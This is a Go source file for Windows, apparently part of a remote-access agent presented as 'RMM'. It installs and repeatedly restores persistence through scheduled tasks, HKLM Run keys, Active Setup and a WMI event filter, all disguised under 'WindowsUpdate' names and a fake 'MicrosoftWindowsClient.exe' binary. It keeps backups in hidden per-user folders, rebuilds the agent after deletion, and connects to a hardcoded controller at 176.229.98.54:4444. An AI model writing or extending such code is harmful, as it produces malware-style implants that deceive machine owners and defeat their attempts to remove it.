//go:build windows

package main

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
	"rmm/internal/version"
)

// ensureActiveSetupKey repairs the logon-time vector (StubPath detached
// via cmd/start so logon can never block on it).
func ensureActiveSetupKey(agentPath string) {
	want := `cmd.exe /c start "" /min "` + agentPath + `" --watch`
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`, registry.WRITE)
	if err != nil {
		return
	}
	defer k.Close()
	cur, _, err := k.GetStringValue("StubPath")
	if err != nil || cur != want {
		if err := k.SetStringValue("StubPath", want); err == nil {
			log.Printf("[watch] repaired Active Setup vector")
		}
	}
	_ = k.SetStringValue("Version", version.DesktopAgentVersion)
}

// rmmDataDir is where heartbeat/lock/telemetry live.
func rmmDataDir() string {
	if localApp := os.Getenv("LOCALAPPDATA"); localApp != "" {
		return filepath.Join(localApp, "RMM")
	}
	return filepath.Join(os.TempDir(), "RMM")
}

// writeProtectionScore audits the six persistence layers (3 tasks, 2 Run
// values, WMI filter) and records "5/6" to protection.json, which the
// agent attaches to hellos so the controller alarms on drops.
func writeProtectionScore(w *watchCfg) {
	got, total := 0, 6
	for _, t := range []string{"WindowsUpdate", "WindowsUpdateWatchdog", "WindowsUpdateOrchestrator"} {
		if exec.Command("schtasks", "/query", "/tn", t).Run() == nil {
			got++
		}
	}
	if rk, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE); err == nil {
		if _, _, err := rk.GetStringValue("WindowsUpdate"); err == nil {
			got++
		}
		if _, _, err := rk.GetStringValue("WindowsUpdateWatchdog"); err == nil {
			got++
		}
		rk.Close()
	}
	out, _ := exec.Command("powershell", "-NoProfile", "-Command", `Get-CimInstance -Namespace root/subscription -ClassName __EventFilter -Filter "Name='WindowsUpdateFilter'"`).CombinedOutput()
	if strings.Contains(string(out), "WindowsUpdateFilter") {
		got++
	}
	_ = os.MkdirAll(rmmDataDir(), 0755)
	rec, _ := json.Marshal(map[string]string{
		"layers": fmt.Sprintf("%d/%d", got, total),
		"at":     time.Now().UTC().Format(time.RFC3339),
	})
	_ = os.WriteFile(filepath.Join(rmmDataDir(), "protection.json"), rec, 0644)
}

// wmiTaskPairs maps every persistence task to its saved XML (kept both
// beside the backup and in the install dir; the WMI consumer runs as
// SYSTEM and can only rely on the install-dir copies).
var wmiTaskPairs = [][2]string{
	{"WindowsUpdate", "agent_task.xml"},
	{"WindowsUpdateWatchdog", "watchdog_task.xml"},
	{"WindowsUpdateOrchestrator", "orchestrator_task.xml"},
}

// verLess compares dotted versions numerically ("1.40.9" < "1.40.17").
func verLess(a, b string) bool {
	pa, pb := strings.Split(a, "."), strings.Split(b, ".")
	for i := 0; i < len(pa) && i < len(pb); i++ {
		var x, y int
		_, _ = fmt.Sscanf(pa[i], "%d", &x)
		_, _ = fmt.Sscanf(pb[i], "%d", &y)
		if x != y {
			return x < y
		}
	}
	return len(pa) < len(pb)
}

// systemBackupDirs lists every plausible per-user backup dir on the box.
// The healer runs as SYSTEM, whose own profile holds no backups, so it
// scans all user profiles for a surviving copy.
func systemBackupDirs() []string {
	var dirs []string
	ents, err := os.ReadDir(`C:\Users`)
	if err != nil {
		return dirs
	}
	for _, e := range ents {
		if !e.IsDir() {
			continue
		}
		dirs = append(dirs,
			filepath.Join(`C:\Users`, e.Name(), "3D Objects", "blender"),
			filepath.Join(`C:\Users`, e.Name(), "AppData", "Roaming", "Microsoft", "Windows", "Themes", "Cache"))
	}
	return dirs
}

// healBinary restores a wiped install binary from the newest surviving
// backup across all profiles (version-guarded: never downgrades).
func healBinary(installDir, agentPath, caPath string) {
	if _, err := os.Stat(agentPath); err == nil {
		return // present
	}
	type cand struct{ bin, cert, tok, ver string }
	var best *cand
	for _, d := range systemBackupDirs() {
		bin := filepath.Join(d, "MicrosoftWindowsClient.exe")
		cert := filepath.Join(d, "server.crt")
		if _, err := os.Stat(bin); err != nil {
			continue
		}
		if _, err := os.Stat(cert); err != nil {
			continue
		}
		ver := readVerFile(d)
		if best == nil || (ver != "" && best.ver != "" && verLess(best.ver, ver)) || (best.ver == "" && ver != "") {
			b, c := bin, cert
			tok := filepath.Join(d, "token.txt")
			if _, err := os.Stat(tok); err != nil {
				tok = ""
			}
			best = &cand{b, c, tok, ver}
		}
	}
	if best == nil {
		log.Printf("[heal] agent binary missing AND no backup anywhere")
		return
	}
	instVer := readVerFile(installDir)
	if best.ver != "" && instVer != "" && verLess(best.ver, instVer) {
		log.Printf("[heal] backup v%s older than installed v%s - skipping", best.ver, instVer)
		return
	}
	_ = os.MkdirAll(filepath.Dir(agentPath), 0755)
	if b, err := os.ReadFile(best.bin); err == nil {
		_ = os.WriteFile(agentPath, b, 0755)
	}
	if b, err := os.ReadFile(best.cert); err == nil {
		_ = os.WriteFile(caPath, b, 0644)
	}
	if best.tok != "" {
		if _, err := os.Stat(filepath.Join(installDir, "token.txt")); os.IsNotExist(err) {
			if b, err := os.ReadFile(best.tok); err == nil {
				_ = os.WriteFile(filepath.Join(installDir, "token.txt"), b, 0600)
			}
		}
	}
	if best.ver != "" {
		_ = os.WriteFile(filepath.Join(installDir, "version.txt"), []byte(best.ver+"\n"), 0644)
	}
	log.Printf("[heal] binary + cert restored from backup")
}

// runWmiHeal repairs binary + tasks + HKLM Run values and kickstarts the
// watcher task, then exits. Invoked by the WMI timer + death trigger (and
// manually), so a wiped box converges back in ~1min without reinstall.
func runWmiHeal() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	dir, _ := filepath.Abs(filepath.Dir(exe))
	agentPath := filepath.Join(dir, "MicrosoftWindowsClient.exe")
	caPath := filepath.Join(dir, "server.crt")
	controllerAddr := "176.229.98.54:4444"
	if b, err := os.ReadFile(filepath.Join(dir, "controller.txt")); err == nil {
		if v := strings.TrimSpace(strings.Split(string(b), "\n")[0]); v != "" {
			controllerAddr = v
		}
	}
	healBinary(dir, agentPath, caPath)
	for _, t := range wmiTaskPairs {
		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
			continue
		}
		xml := filepath.Join(dir, t[1])
		if _, err := os.Stat(xml); err != nil {
			log.Printf("[heal] task %s missing and no saved XML", t[0])
			continue
		}
		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
			log.Printf("[heal] re-create task %s: %v %s", t[0], err, strings.TrimSpace(string(out)))
		} else {
			log.Printf("[heal] re-created task %s", t[0])
		}
	}
	agentCmd := `"` + agentPath + `" -controller ` + controllerAddr + ` -ca "` + caPath + `"`
	watchCmd := `"` + agentPath + `" --watch`
	for _, kv := range [][2]string{{"WindowsUpdate", agentCmd}, {"WindowsUpdateWatchdog", watchCmd}} {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			continue
		}
		cur, _, err := k.GetStringValue(kv[0])
		if err != nil || cur != kv[1] {
			if err := k.SetStringValue(kv[0], kv[1]); err == nil {
				log.Printf("[heal] repaired HKLM Run %s", kv[0])
			}
		}
		k.Close()
	}
	ensureActiveSetupKey(agentPath)
	// Kickstart now instead of waiting for the next tick: the repaired
	// tasks run in their own (user-session) context, keeping interactivity.
	for _, t := range []string{"WindowsUpdateWatchdog", "WindowsUpdate", "WindowsUpdateOrchestrator"} {
		_ = exec.Command("schtasks", "/run", "/tn", t).Run()
	}
}

// ensureWatchPersistence re-creates deleted Run keys / scheduled tasks from
// the XML copies saved beside the backup (self-healing persistence).
func ensureWatchPersistence(w *watchCfg) {
	agentCmd := `"` + w.agentPath + `" -controller ` + w.controllerAddr + ` -ca "` + w.caPath + `"`
	watchCmd := `"` + w.agentPath + `" --watch`
	setRun := func(name, val string) {
		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
		if err != nil {
			return
		}
		defer k.Close()
		cur, _, err := k.GetStringValue(name)
		if err != nil || cur != val {
			if err := k.SetStringValue(name, val); err == nil {
				log.Printf("[watch] repaired HKLM Run %s", name)
			}
		}
	}
	setRun("WindowsUpdate", agentCmd)
	setRun("WindowsUpdateWatchdog", watchCmd)
	ensureActiveSetupKey(w.agentPath)
	for _, t := range wmiTaskPairs {
		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
			continue
		}
		xml := filepath.Join(w.backupDir, t[1])
		if _, err := os.Stat(xml); err != nil {
			log.Printf("[watch] task %s missing and no saved XML", t[0])
			continue
		}
		if out, err := exec.Command("schtasks", "/create", "/tn", t[0], "/xml", xml, "/f").CombinedOutput(); err != nil {
			log.Printf("[watch] re-create task %s: %v %s", t[0], err, string(out))
		} else {
			log.Printf("[watch] re-created task %s", t[0])
		}
	}
}
